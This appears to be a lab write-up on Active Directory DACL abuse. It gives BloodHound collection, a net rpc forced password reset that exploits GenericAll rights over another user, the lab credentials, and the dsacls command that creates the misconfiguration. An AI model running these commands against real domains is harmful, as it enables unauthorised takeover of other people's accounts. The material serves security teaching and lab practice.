User Owns Generic ALL for Another User


DACL Abuse (GenericAll on User)

  1. 1.

    1. Hypothesis & Vulnerability Identification

Hypothesis: Following the compromise of user goku_saiyan88 (Password: UltraInstinct!9), we analyzed their permissions against other domain objects. We hypothesized that this user might hold delegated control over specific personnel in the domain.

Findings: BloodHound analysis revealed that goku_saiyan88 possesses GenericAll rights over the user kakashi_hatake12.

Impact: GenericAll on a User Object grants full control, allowing the attacker to forcibly change the target's password without knowing the current one, effectively hijacking the account.

  1. 2.

    2. Data Collection (Ingestion)

Objective: Refresh the dataset using the newly compromised credentials to ensure accurate pathfinding.

Execution:

bloodhound-python -u goku_saiyan88 -p 'UltraInstinct!9' -ns 192.168.56.10 -d shinobi.local -c All

  1. 3.

    3. Attack Execution: Targeted Password Reset

Objective: Abuse the GenericAll permission to force a password reset on kakashi_hatake12, granting us immediate access to their account. Tool: net rpc (Samba Suite).

Command:

net rpc password "kakashi_hatake12" "Simple@Password123" -U shinobi.local/goku_saiyan88%'UltraInstinct!9' -S 192.168.56.10

Findings: The command executed successfully via the SAMR pipe. The target user's password was instantly changed to Simple@Password123 without requiring administrative privileges, verifying the critical nature of the GenericAll misconfiguration.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  1. 4.

    4. Vulnerability Configuration (Lab Setup)

Objective: To replicate this "Shadow Admin" scenario in the lab, we manually modified the ACL of the target user to grant full control to the attacker account.

  • Tool Used: dsacls.exe (Domain Security Access Control Lists) on the Domain Controller.

  • Configuration Logic: We assigned GenericAll (GA) permissions on the kakashi_hatake12 object to the principal goku_saiyan88.

Execution Command:

dsacls "CN=kakashi_hatake12,CN=Users,DC=shinobi,DC=local" /G shinobi\goku_saiyan88:GA

  • CN=kakashi_hatake12...: The Distinguished Name (DN) of the victim.

  • /G ... :GA: Grants (G) the GenericAll permission.
